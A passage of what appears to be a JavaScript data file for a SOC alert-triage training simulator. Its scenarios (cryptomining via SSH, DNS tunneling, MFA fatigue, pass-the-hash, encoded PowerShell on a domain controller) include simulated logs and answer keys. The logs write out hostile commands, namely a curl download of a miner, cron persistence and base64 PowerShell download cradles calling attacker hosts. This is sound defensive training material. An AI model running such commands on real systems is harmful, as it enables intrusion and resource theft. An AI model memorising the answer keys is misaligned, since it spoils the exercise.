      ev(["11:15:30", "sysmon", "Sysmon (WKSTN-102)", "3", "Network connection", "WKSTN-102", "Image: svchost.exe (Temp) | Src: 10.10.20.102:52002 | Dst: 104.248.10.5:443 | Proto: TCP (60s interval)"]),
      ev(["11:30:00", "security", "Security (WKSTN-102)", "4688", "A new process has been created", "WKSTN-102", "NewProcess: C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe | Parent: powershell.exe | Signed: false"]),
      ev(["11:31:00", "security", "Security (WKSTN-102)", "4698", "A scheduled task was created", "WKSTN-102", "TaskName: FontCacheUpdate | Action: C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe | Trigger: Every 15 min"])
    ],
    processes: [
      pr([1, null, "powershell.exe", "powershell.exe (download + drop stage)", "acorp\\t.park", "Medium", true]),
      pr([2, 1, "C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe", "svchost.exe (MASQUERADED - unsigned, in Temp)", "acorp\\t.park", "Medium", true]),
      pr([3, 2, "svchost.exe (Temp)", "DGA: hundreds of NXDOMAIN queries (x7k9m2..., a3b5c7...) + C2 to 104.248.10.5:443", "acorp\\t.park", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P3",
      actions: ["isolate-host", "block-domain", "delete-artifact", "esc-l2", "monitor"],
      mitre: ["T1568.002", "T1071.004", "T1053.005"],
      reasoning: "TRUE POSITIVE — DGA + C2. An unsigned binary masquerading as svchost.exe (running from %TEMP%, not System32) generates hundreds of high-entropy NXDOMAIN DNS queries (classic DGA seed-resolution pattern, T1568.002 / T1071.004), then connects on a regular interval to a VPS. A scheduled task keeps it alive. Severity MEDIUM/P3 (C2 pattern confirmed on a standard workstation, no data exfil or lateral movement yet). Isolate the host, block the DGA domain and C2 IP, remove the task, and escalate to L2 for beacon-frequency analysis across the fleet."
    },
    keyEvidence: [
      { id: "search-entropy", keyword: "NXDOMAIN" },
      { id: "intel-x7k9m2p4q1w3e5r7t9y.example.com" },
      { id: "process-tree" }
    ]
  },

  {
    id: "mfa-fatigue",
    title: "MFA Fatigue Attack on CFO",
    difficulty: "Hard",
    category: "Identity/Cloud",
    summary: "A storm of MFA push prompts to the CFO's phone from Russia, one finally approved, then self-granted Global Admin and mail forwarding.",
    alert: {
      rule: "Cloud Identity - Multiple MFA Denials Then Approval",
      severity: "High",
      ts: "2024-01-15 22:56:00 UTC",
      host: "— (Entra ID)",
      user: "c.garcia",
      ips: ["91.219.236.245"],
      domains: [],
      hashes: [],
      mitreHint: "T1621 (MFA fatigue)"
    },
    entities: { host: "Entra ID", user: "c.garcia" },
    assets: {
      "Entra ID": { role: "Identity provider (Azure AD / Entra ID)", tier: "Tier 0", os: "Cloud", edr: "N/A", owner: "Identity team", note: "Controls access to Microsoft 365 + all cloud apps." }
    },
    users: {
      "c.garcia": { dept: "Finance", title: "Chief Financial Officer (CFO)", groups: ["CFO", "Finance Leadership"], mfa: "Enabled (MS Authenticator)", lastPw: "2023-07-01", risk: "High-value user (financial authority)", note: "Also a Privileged Role Administrator." }
    },
    intel: {
      "91.219.236.245": { vt: "52/92", abuse: "96% confidence", geo: "Russia", notes: "Known source of MFA fatigue / credential-stuffing campaigns. High confidence malicious." }
    },
    events: [
      ev(["22:50:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia@corp.local | MFA: Push sent | IP: 91.219.236.245 | Device: Unknown (Firefox on Windows)"]),
      ev(["22:51:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push DENIED", "—", "User: c.garcia | MFA: Denied by user | IP: 91.219.236.245"]),
      ev(["22:52:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:53:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push DENIED", "—", "User: c.garcia | MFA: Denied by user | IP: 91.219.236.245"]),
      ev(["22:54:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:55:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:56:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push APPROVED", "—", "User: c.garcia | MFA: Approved | IP: 91.219.236.245 | NOTE: approved from a different device (Safari on macOS)"]),
      ev(["22:56:30", "cloud", "Microsoft Entra ID", "AUDIT", "Privileged role granted", "—", "User: c.garcia | Role: Global Administrator | Performed by: c.garcia (self-grant)"]),
      ev(["22:57:00", "cloud", "Microsoft Entra ID", "AUDIT", "Mailbox rule created", "—", "User: c.garcia | Rule: forward all mail to external@protonmail.com"]),
      ev(["22:58:00", "security", "Security (DC01)", "4624", "An account was successfully logged on", "—", "Account: c.garcia | LogonType: 3 (Network) | Source: 91.219.236.245 | AuthPackage: Kerberos"]),
      ev(["23:00:00", "cloud", "Microsoft Entra ID", "AUDIT", "MFA method added", "—", "User: c.garcia | Added authenticator app (new device)"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["disable-account", "reset-password", "block-ip", "esc-l2", "notify-manager"],
      mitre: ["T1621", "T1078.001", "T1098.001"],
      reasoning: "TRUE POSITIVE — MFA fatigue (push-bombing) succeeded. Six MFA prompts from a Russian IP, four denied by the (sleeping?) user, until one was approved from a DIFFERENT device. The attacker then self-granted Global Administrator (T1098.001), created a mail-forwarding rule, added their own authenticator, and authenticated to the domain. This is a confirmed privileged-cloud compromise (T1621 + T1078). Severity HIGH/P2 (privileged account compromise with tenant-level impact, could hit P1). Disable the account NOW, reset credentials + remove added MFA methods, revoke sessions, block the IP, and escalate to L2/IR."
    },
    keyEvidence: [
      { id: "search-MFA", keyword: "MFA" },
      { id: "user-c.garcia" },
      { id: "intel-91.219.236.245" }
    ]
  },

  {
    id: "linux-crypto",
    title: "Linux SSH Compromise → Crypto Mining",
    new: true,
    difficulty: "Medium",
    category: "Impact",
    summary: "SSH brute force succeeds via a stolen key, then curl pulls a miner to /tmp and a cron job makes it persist — resource hijacking on an internet-facing web server.",
    alert: {
      rule: "EDR - Resource Hijacking - High CPU + Mining Pool Connection",
      severity: "High",
      ts: "2024-01-18 22:41:05 UTC",
      host: "LINUX-APP-01",
      user: "ubuntu",
      ips: ["198.51.100.77", "203.0.113.66"],
      domains: ["mining.pool.example.net"],
      hashes: ["d41d8cd98f00b204e9800998ecf8427e"],
      mitreHint: "T1496 (resource hijacking) / T1110 (SSH brute force)"
    },
    entities: { host: "LINUX-APP-01", user: "ubuntu" },
    assets: {
      "LINUX-APP-01": { role: "Public web application server", tier: "Tier 1", os: "Ubuntu 22.04 LTS", edr: "Healthy (auditd + Falco)", owner: "IT Ops", note: "Internet-facing; hosts the customer portal." }
    },
    users: {
      "ubuntu": { dept: "IT Ops", title: "Deployment account", groups: ["sudo"], mfa: "SSH key only", lastPw: "2023-11-02", risk: "Shared deploy account, no MFA" },
      "root": { dept: "IT Ops", title: "Root", groups: ["root"], mfa: "SSH key", lastPw: "2022-06-14", risk: "Privileged" }
    },
    intel: {
      "198.51.100.77": { vt: "18/92", abuse: "84% confidence", geo: "Unknown (abuse-host)", notes: "Documented Monero mining pool endpoint. Also served xmrig binaries directly over HTTP." },
      "203.0.113.66": { vt: "9/92", abuse: "77% confidence", geo: "Germany", notes: "Compromised VPS used as a jump box; observed in multiple SSH brute-force campaigns (T1110)." },
      "mining.pool.example.net": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Mining pool domain. No legitimate business relationship with this org." },
      "d41d8cd98f00b204e9800998ecf8427e": { vt: "n/a", abuse: "n/a", geo: "—", notes: "MD5 of an empty string — attacker avoided a real hash match, a laundering trick (T1036)." }
    },
    events: [
      ev(["20:11:24", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for ubuntu", "LINUX-APP-01", "Failed password for ubuntu from 203.0.113.66 port 51222 ssh2 | x8 failures this minute"]),
      ev(["20:12:09", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for root", "LINUX-APP-01", "Failed password for root from 203.0.113.66 | pattern: username spray"]),
      ev(["20:47:31", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for ubuntu", "LINUX-APP-01", "Failed password for ubuntu from 203.0.113.66 | continued spray"]),
      ev(["21:05:18", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd accepted publickey for ubuntu", "LINUX-APP-01", "Accepted publickey for ubuntu from 203.0.113.66 | key fingerprint 2f:9d:... matches a rotated key marked as revoked"]),
      ev(["21:05:20", "audit", "auditd (LINUX-APP-01)", "EXEC", "execve /usr/bin/curl", "LINUX-APP-01", "execve /usr/bin/curl | argv: curl -o /tmp/xmrig http://198.51.100.77/xmrig | uid=1000(ubuntu)"]),
      ev(["21:05:28", "audit", "auditd (LINUX-APP-01)", "EXEC", "execve /tmp/xmrig", "LINUX-APP-01", "execve /tmp/xmrig | argv: /tmp/xmrig --algo rx/0 -o pool:3333 --user acct_x7q9k | uid=1000(ubuntu)"]),
      ev(["21:05:40", "audit", "auditd (LINUX-APP-01)", "FILE", "authorized_keys modified", "LINUX-APP-01", "~/.ssh/authorized_keys for ubuntu appended: ssh-ed25519 AAAAC3NzaC1l... (persistence)"]),
      ev(["21:06:00", "audit", "auditd (LINUX-APP-01)", "FILE", "crontab modified", "LINUX-APP-01", "/etc/cron.d/miner created | Entry: * * * * * root /tmp/xmrig --daemon"]),
      ev(["21:07:11", "sysmon", "Falco (LINUX-APP-01)", "3", "Network connection", "LINUX-APP-01", "Process: /tmp/xmrig | Src: 10.20.1.15:34512 | Dst: 198.51.100.77:3333 | Proto: TCP | mining pool"]),
      ev(["22:15:00", "sysmon", "Falco (LINUX-APP-01)", "CPU", "Resource usage spike", "LINUX-APP-01", "/tmp/xmrig consuming 640% CPU (16 cores saturated) | up for 70 min"]),
      ev(["22:41:05", "sysmon", "Falco (LINUX-APP-01)", "ALERT", "Alert: Resource hijacking", "LINUX-APP-01", "Suspicious binary in /tmp with outbound connection to mining pool + cron persistence + high CPU"])
    ],
    processes: [
      pr([1, null, "sshd", "/usr/sbin/sshd -D", "root", "root", false]),
      pr([2, 1, "bash", "bash (SSH session for ubuntu via publickey)", "ubuntu", "ubuntu", true]),
      pr([3, 2, "curl", "curl -o /tmp/xmrig http://198.51.100.77/xmrig", "ubuntu", "ubuntu", true]),
      pr([4, 2, "xmrig", "/tmp/xmrig --algo rx/0 -o pool:3333 --user acct_x7q9k", "ubuntu", "ubuntu", true]),
      pr([5, 4, "cron", "/etc/cron.d/miner -> /tmp/xmrig --daemon (persistence)", "root", "root", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-ip", "block-domain", "disable-account", "delete-artifact", "esc-l2"],
      mitre: ["T1110.001", "T1078.001", "T1059.004", "T1105", "T1053.003", "T1496"],
      reasoning: "TRUE POSITIVE — resource hijacking (crypto mining). The box was brute-forced over SSH (T1110), the attacker got in with a stolen/revoked key (T1078, note the 'revoked key' detail), downloaded xmrig to /tmp via curl (T1105), added their own SSH key + a /etc/cron.d entry for persistence (T1053.003), and beaconed to a documented mining pool (T1496). Tier-1 internet-facing server with 640% CPU means business impact. Severity HIGH/P2. Contain: isolate the host, block the pool IP/domain, rotate the account keys, remove the cron entry + backdoor key, then escalate to L2."
    },
    keyEvidence: [
      { id: "intel-198.51.100.77" },
      { id: "user-ubuntu" },
      { id: "search-xmrig", keyword: "xmrig" },
      { id: "search-cron", keyword: "cron" }
    ]
  },

  {
    id: "dns-tunnel",
    title: "DNS Tunneling — Data Exfiltration",
    new: true,
    difficulty: "Medium",
    category: "Network",
    summary: "An R&D workstation makes thousands of long high-entropy DNS queries to a freshly registered domain; TXT answers carry a compressed archive of stolen files.",
    alert: {
      rule: "DNS - Abnormal Volume of High-Entropy TXT Queries",
      severity: "High",
      ts: "2024-01-20 14:02:31 UTC",
      host: "WKS-0417",
      user: "r.singh",
      ips: ["203.0.113.88"],
      domains: ["cdn-update-host.com"],
      hashes: [],
      mitreHint: "T1071.004 (DNS) / T1048.001 (exfil over DNS)"
    },
    entities: { host: "WKS-0417", user: "r.singh" },
    assets: {
      "WKS-0417": { role: "R&D workstation (prototype source)", tier: "Tier 2", os: "Windows 11", edr: "Healthy (CrowdStrike)", owner: "R&D dept", note: "Holds access to the code repository. High-value target." }
    },
    users: {
      "r.singh": { dept: "R&D", title: "Principal Engineer", groups: ["R&D", "Developers"], mfa: "Enabled", lastPw: "2023-12-18", risk: "Local admin on workstation" }
    },
    intel: {
      "cdn-update-host.com": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Registered 2024-01-15 (5 days ago) via a privacy registrar. No legitimate CDN footprint — name is a decoy for the real traffic." },
      "203.0.113.88": { vt: "12/92", abuse: "80% confidence", geo: "Unknown", notes: "Authoritative NS for cdn-update-host.com. Known DNSCat2 listener infrastructure." }
    },
    events: [
      ev(["13:40:00", "sysmon", "Sysmon (WKS-0417)", "1", "Process Create", "WKS-0417", "Image: powershell.exe | Parent: OUTLOOK.EXE | User: acorp\\r.singh | CmdLine: powershell.exe -enc <encoded download>"]),
      ev(["13:41:12", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: 3b7f8a91c2d4e6... (64-char base64).cdn-update-host.com | Type: TXT"]),
      ev(["13:41:16", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: e2a4f9c81b3d0...cdn-update-host.com | Type: TXT | high entropy, ~60 chars"]),
      ev(["13:41:20", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: 9c1b0a2f7d4e...cdn-update-host.com | Type: TXT | queries every ~4 seconds"]),
      ev(["13:44:00", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'UEsDBA...' (base64 ZIP header signature)"]),
      ev(["13:50:00", "proxy", "Proxy (CORP-GW)", "HTTP", "Blocked / no outbound HTTP", "WKS-0417", "No direct internet HTTP(S) traffic from host — only DNS queries leaving the estate"]),
      ev(["13:55:00", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'Q2xhc3NpZmllZC...' (classifier text)"]),
      ev(["14:00:30", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'UEsDBBQAAAAIA...' (continued ZIP stream)"]),
      ev(["14:02:31", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "~2,300 TXT queries to cdn-update-host.com in the last 20 min | total ~1.4 MB transferred via DNS"])
    ],
    processes: [
      pr([1, null, "OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "acorp\\r.singh", "Medium", false]),
      pr([2, 1, "powershell.exe", "powershell.exe -enc <encoded download cradle>", "acorp\\r.singh", "Medium", true]),
      pr([3, 2, "powershell.exe", "dnscat2 client (DNS tunneling agent)", "acorp\\r.singh", "Medium", true]),
      pr([4, 3, "dnscat2.exe", "C:\\Users\\rsingh\\AppData\\Local\\Temp\\dnscat2.exe (tunnel process)", "acorp\\r.singh", "Medium", true])
    ],
    encodedCommands: ["SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQBoAG8AcwB0AC4AYwBvAG0ALwBkAG4AcwBjAGEAdAAuAHAAcwAxACcAKQA="],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-domain", "block-ip", "esc-l2"],
      mitre: ["T1027.010", "T1105", "T1071.004", "T1048.001"],
      reasoning: "TRUE POSITIVE — DNS tunneling exfiltration (T1048.001). A phishing-adjacent encoded PowerShell (T1027.010) downloaded a DNSCat2 client (T1105) which beaconed via DNS to a 5-day-old domain (T1071.004). The tell: ~2,300 high-entropy TXT queries in 20 min, with TXT answers containing base64 ZIP headers (UEsDB...) — an archive is leaving the network inside DNS responses, bypassing the proxy that blocks all other outbound HTTP. Severity HIGH/P2: confirmed data exfiltration from an R&D workstation holding source code (could be P1 with DLP confirmation). Isolate the host, block the domain + NS IP at the DNS layer, and escalate to IR/L2 immediately."
    },
    keyEvidence: [
      { id: "intel-cdn-update-host.com" },
      { id: "search-TXT", keyword: "TXT" },
      { id: "decode-base64" },
      { id: "process-tree" }
    ]
  },

  {
    id: "pw-spray-vpn",
    title: "VPN Password Spray",
    difficulty: "Medium",
    category: "Identity",
    summary: "Sustained password spray against the VPN gateway with one successful logon for a Finance user, followed by SMB enumeration from the VPN pool.",
    alert: {
      rule: "Identity Analytics - Password Spray Detected",
      severity: "Medium",
      ts: "2024-02-06 09:00:00 UTC",
      host: "VPN-GW-01",
      user: "multiple",
      ips: ["45.155.205.10"],
      domains: [],
      hashes: [],
      mitreHint: "T1110.003 (Password Spraying)"
    },
    entities: { host: "VPN-GW-01", user: "s.moreno" },
    assets: {
      "VPN-GW-01": { role: "VPN gateway", tier: "Edge", os: "Pulse Secure", edr: "n/a (network)", owner: "Infrastructure" },
      "FS-01": { role: "File server (Finance)", tier: "Tier 1", os: "Windows Server 2019", edr: "Healthy", owner: "Finance" }
    },
    users: {
      "s.moreno": { dept: "Finance", title: "AP Specialist", groups: ["Finance", "Finance-Shares"], mfa: "Enabled", lastPw: "2023-11-30", risk: "None flagged" }
    },
    intel: {
      "45.155.205.10": { vt: "9/91", abuse: "70% confidence", geo: "RU (TOR exit)", notes: "Known scanning/spray source. Multiple organizations report 4625 floods to VPN/OWA endpoints from this IP." }
    },
    events: [
      ev(["08:44:00", "security", "Security (VPN-GW-01)", "4625", "An account failed to log on (VPN)", "VPN-GW-01", "Account: j.king | Source IP: 45.155.205.10 | Protocol: SSL-VPN"]),
      ev(["08:44:02", "security", "Security (VPN-GW-01)", "4625", "An account failed to log on (VPN)", "VPN-GW-01", "Account: m.lopez | Source IP: 45.155.205.10 | Protocol: SSL-VPN"]),
      ev(["08:44:05", "security", "Security (VPN-GW-01)", "4625", "An account failed to log on (VPN)", "VPN-GW-01", "Account: r.rahman | Source IP: 45.155.205.10 | Protocol: SSL-VPN"]),
      ev(["08:44:30", "security", "Security (VPN-GW-01)", "4625", "An account failed to log on (VPN)", "VPN-GW-01", "Account: s.moreno | Source IP: 45.155.205.10 | Protocol: SSL-VPN"]),
      ev(["08:45:20", "security", "Security (VPN-GW-01)", "4625", "An account failed to log on (VPN)", "VPN-GW-01", "Account: p.haddad | Source IP: 45.155.205.10 | Protocol: SSL-VPN"]),
      ev(["08:52:40", "security", "Security (VPN-GW-01)", "4624", "An account was successfully logged on (VPN)", "VPN-GW-01", "Account: s.moreno | Source IP: 45.155.205.10 | LogonType: 3 | MFA: Not enforced on VPN"]),
      ev(["08:55:11", "security", "Security (DC-01)", "4624", "Logon from VPN pool", "DC-01", "Account: s.moreno | Source IP: 10.8.0.15 (VPN pool) | LogonType: 3"]),
      ev(["09:00:00", "security", "Security (DC-01)", "5140", "Network share object was accessed", "DC-01", "Share: \\\\FS-01\\Finance$ | User: s.moreno | IP: 10.8.0.15 | Access: Read"]),
      ev(["09:03:47", "security", "Security (DC-01)", "5140", "Network share object was accessed", "DC-01", "Share: \\\\FS-01\\Finance$ | User: s.moreno | IP: 10.8.0.15 | Access: Read (bulk, 40+ files)"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["disable-account", "reset-password", "block-ip", "esc-l2"],
      mitre: ["T1110.003", "T1078.001", "T1021.002"],
      reasoning: "TRUE POSITIVE — password spraying (T1110.003) with account compromise. One external source hit dozens of user accounts on the VPN gateway, then got a single hit on s.moreno (LogonType 3, and notably MFA was NOT enforced on the VPN path). Within minutes the account enumerated and read the Finance share. Severity HIGH/P2: a valid corporate account is under attacker control at the perimeter. Disable the account, force password reset + MFA enrollment, block the source IP, and escalate to L2 to assess what was accessed and check for other successful logons."
    },
    keyEvidence: [
      { id: "intel-45.155.205.10" },
      { id: "search-4625", keyword: "4625" },
      { id: "search-5140", keyword: "5140" },
      { id: "user-s.moreno" }
    ]
  },

  {
    id: "pth-lateral",
    title: "Pass-the-Hash Lateral Movement",
    difficulty: "Medium",
    category: "Identity/AD",
    summary: "Credential material dumped on a workstation, followed by NTLM logons from that host to a file server and remote service creation.",
    alert: {
      rule: "EDR - lsass.exe Memory Access Detected",
      severity: "High",
      ts: "2024-02-12 14:20:00 UTC",
      host: "WKS-0442",
      user: "d.klein",
      ips: ["10.10.30.42"],
      domains: [],
      hashes: [],
      mitreHint: "T1003.001 (LSASS) + T1550.002 (PTH)"
    },
    entities: { host: "WKS-0442", user: "d.klein" },
    assets: {
      "WKS-0442": { role: "Desktop (Engineering)", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "Engineering" },
      "FS-02": { role: "File server (Engineering)", tier: "Tier 1", os: "Windows Server 2022", edr: "Healthy", owner: "Engineering" }
    },
    users: {
      "d.klein": { dept: "Engineering", title: "Mechanical Engineer", groups: ["Engineering"], mfa: "Enabled", lastPw: "2023-09-12", risk: "None flagged" }
    },
    intel: {
      "10.10.30.42": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Internal workstation. Source of NTLM logons that do not match d.klein's normal access pattern." }
    },
    events: [
      ev(["14:20:00", "sysmon", "Sysmon (WKS-0442)", "10", "Process accessed LSASS", "WKS-0442", "Source: C:\\Users\\d.klein\\Desktop\\mimikatz.exe | Target: lsass.exe | GrantedAccess: 0x1010 (read memory)"]),
      ev(["14:21:05", "security", "Security (WKS-0442)", "4688", "A new process has been created", "WKS-0442", "Process: C:\\Users\\d.klein\\Desktop\\mimikatz.exe | User: d.klein"]),
      ev(["14:25:40", "security", "Security (DC-01)", "4624", "NTLM logon from workstation", "DC-01", "Account: acorp\\d.klein | Source: WKS-0442 | LogonType: 3 | Auth: NTLM (rare for this account)"]),
      ev(["14:26:12", "security", "Security (FS-02)", "4624", "NTLM logon to file server", "FS-02", "Account: acorp\\d.klein | Source: WKS-0442 | LogonType: 3 | Auth: NTLM"]),
      ev(["14:26:40", "security", "Security (FS-02)", "5140", "Network share object was accessed", "FS-02", "Share: \\\\FS-02\\Engineering$ | User: d.klein | IP: 10.10.30.42"]),
      ev(["14:30:15", "system", "System (FS-02)", "7045", "A service was installed", "FS-02", "Service: WindowsUpdateSvc | Image: C:\\Windows\\Temp\\winupd.exe | RunAs: SYSTEM"]),
      ev(["14:31:00", "sysmon", "Sysmon (FS-02)", "3", "Network connection", "FS-02", "Image: winupd.exe | Dst: 185.94.191.9:443"])
    ],
    processes: [
      pr([1, null, "mimikatz.exe", "C:\\Users\\d.klein\\Desktop\\mimikatz.exe (dumped lsass)", "acorp\\d.klein", "Medium", true]),
      pr([2, 1, "winupd.exe", "C:\\Windows\\Temp\\winupd.exe (service on FS-02, persisted via 7045)", "NT AUTHORITY\\SYSTEM", "Medium", true]),
      pr([3, 2, "winupd.exe", "Beacon to 185.94.191.9:443", "NT AUTHORITY\\SYSTEM", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["isolate-host", "disable-account", "block-ip", "esc-ir"],
      mitre: ["T1003.001", "T1550.002", "T1543.003", "T1021.002"],
      reasoning: "TRUE POSITIVE — credential dumping and pass-the-hash lateral movement. mimikatz (or equivalent) read lsass memory (T1003.001) on WKS-0442, and the workstation then produced NTLM logons to FS-02 (T1550.002) — anomalous for this account. A persistence service (T1543.003) was installed on FS-02 and beacons to a known C2 IP. Severity CRITICAL/P1: domain credentials in attacker hands and persistence on a Tier-1 server. Isolate both hosts, disable the account, block the C2 IP, and escalate to IR immediately."
    },
    keyEvidence: [
      { id: "search-lsass", keyword: "lsass" },
      { id: "search-5140", keyword: "5140" },
      { id: "search-7045", keyword: "7045" },
      { id: "process-tree" }
    ]
  },

  {
    id: "powershell-dc",
    title: "PowerShell Encoded on Domain Controller",
    difficulty: "Hard",
    category: "Endpoint",
    summary: "An encoded PowerShell one-liner ran on a domain controller and installed a service pointing at a binary in the Temp folder.",
    alert: {
      rule: "EDR - Suspicious PowerShell (encoded) on Domain Controller",
      severity: "High",
      ts: "2024-02-18 03:00:00 UTC",
      host: "DC-01",
      user: "svc-backup",
      ips: ["10.10.1.10"],
      domains: ["update-check.cdn-zone.io"],
      hashes: ["4f5a1d8e2b9c4f7a..."],
      mitreHint: "T1027.010 (Command Obfuscation) + T1543.003 (Create/Modify Service)"
    },
    entities: { host: "DC-01", user: "svc-backup" },
    assets: {
      "DC-01": { role: "Domain Controller", tier: "Tier 0", os: "Windows Server 2019", edr: "Healthy", owner: "Infrastructure" }
    },
    users: {
      "svc-backup": { dept: "IT", title: "Backup Service Account", groups: ["Backup Operators", "Domain Users"], mfa: "n/a (service)", lastPw: "2022-06-01", risk: "Stale service account" }
    },
    intel: {
      "10.10.1.10": { vt: "n/a", abuse: "n/a", geo: "—", notes: "DC-01 internal address. Host itself is legitimate — the anomaly is the encoded PowerShell + service install." },
      "4f5a1d8e2b9c4f7a...": { vt: "16/68", abuse: "—", geo: "—", notes: "Unsigned PE downloaded by the encoded cradle. High detection ratio; consistent with service-backdoor payloads." },
      "update-check.cdn-zone.io": { vt: "3/86", abuse: "58% confidence", geo: "SE", notes: "2-week-old domain. Pages require TLS and return an executable; not the company's real update host (check with IT)." }
    },
    events: [
      ev(["03:00:00", "powershell", "PowerShell (DC-01)", "4104", "Script block logged", "DC-01", "User: svc-backup | ScriptBlock: powershell -enc <encoded> | Decoded hints: download, svc.exe, update-check.cdn-zone.io"]),
      ev(["03:00:03", "sysmon", "Sysmon (DC-01)", "3", "Network connection", "DC-01", "Image: powershell.exe | Dst: update-check.cdn-zone.io:443"]),
      ev(["03:01:12", "system", "System (DC-01)", "7045", "A service was installed", "DC-01", "Service: WindowsUpdaterSvc | Image: C:\\Windows\\Temp\\svc.exe | StartType: Auto"]),
      ev(["03:02:00", "security", "Security (DC-01)", "4697", "A service was installed", "DC-01", "Service: WindowsUpdaterSvc | Account: LocalSystem"]),
      ev(["03:05:30", "sysmon", "Sysmon (DC-01)", "3", "Network connection", "DC-01", "Image: svc.exe | Dst: update-check.cdn-zone.io:443 (beacon, 5 min interval)"])
    ],
    processes: [
      pr([1, null, "svc-backup (WinRM session)", "Inbound WinRM session from 10.10.40.77", "acorp\\svc-backup", "Medium", true]),
      pr([2, 1, "powershell.exe", "powershell.exe -enc <encoded downloader>", "acorp\\svc-backup", "Medium", true]),
      pr([3, 2, "C:\\Windows\\Temp\\svc.exe", "svc.exe (registered as WindowsUpdaterSvc, Auto start)", "LocalSystem", "Medium", true]),
      pr([4, 3, "svc.exe", "Beacon to update-check.cdn-zone.io:443", "LocalSystem", "Medium", true])
    ],
    encodedCommands: ["SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGgAZQBjAGsALgBjAGQAbgAtAHoAbwBuAGUALgBpAG8ALwBzAHYAYwAuAGUAeABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwB2AGMALgBlAHgAZQAnACkA"],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["isolate-host", "delete-artifact", "block-domain", "reset-password", "esc-ir"],
      mitre: ["T1027.010", "T1105", "T1543.003", "T1078.001"],
      reasoning: "TRUE POSITIVE — potential domain controller compromise. An encoded PowerShell cradle (T1027.010) ran on a Tier-0 host via the svc-backup account and downloaded an executable (T1105) that was registered as an auto-start service (T1543.003). The stale, high-privilege service account (T1078.001) is the likely entry point. Severity CRITICAL/P1: attacker-controlled code on a DC. Isolate, remove the service + binary, block the domain, rotate svc-backup (assume its password is exposed), and escalate to IR for full domain-wide assessment (Golden Ticket / Kerberoasting checks)."
    },
    keyEvidence: [
      { id: "decode-base64" },
      { id: "search-7045", keyword: "7045" },
      { id: "search-svc-backup", keyword: "svc-backup" },
      { id: "intel-update-check.cdn-zone.io" },
      { id: "process-tree" }
    ]
  },

  {
    id: "iis-webshell",
    title: "Web Shell on IIS Web Server",
    difficulty: "Medium",
    category: "Web",
    summary: "An ASPX web shell was dropped into the web root of the public portal and used to run commands, with outbound traffic to a VPN server.",
    alert: {
      rule: "EDR - w3wp.exe spawning cmd.exe (unusual)",
      severity: "High",
      ts: "2024-02-25 16:40:00 UTC",
      host: "WEB-02",
      user: "IUSR (anonymous)",
      ips: ["91.219.236.44"],
      domains: [],
      hashes: [],
      mitreHint: "T1505.003 (Web Shell)"
    },
    entities: { host: "WEB-02", user: "IUSR" },
    assets: {
      "WEB-02": { role: "Public web portal (DMZ)", tier: "Tier 2", os: "Windows Server 2022 / IIS", edr: "Healthy", owner: "Web Team" }
    },
    users: {
      "IUSR": { dept: "Web", title: "IIS application pool identity", groups: ["IIS_IUSRS"], mfa: "n/a", lastPw: "n/a", risk: "Built-in app pool account" }
    },
    intel: {
      "91.219.236.44": { vt: "11/90", abuse: "66% confidence", geo: "NL", notes: "Known exploitation source for web-app vulnerabilities. Consistent with recent IIS webshell campaigns." }
    },
    events: [
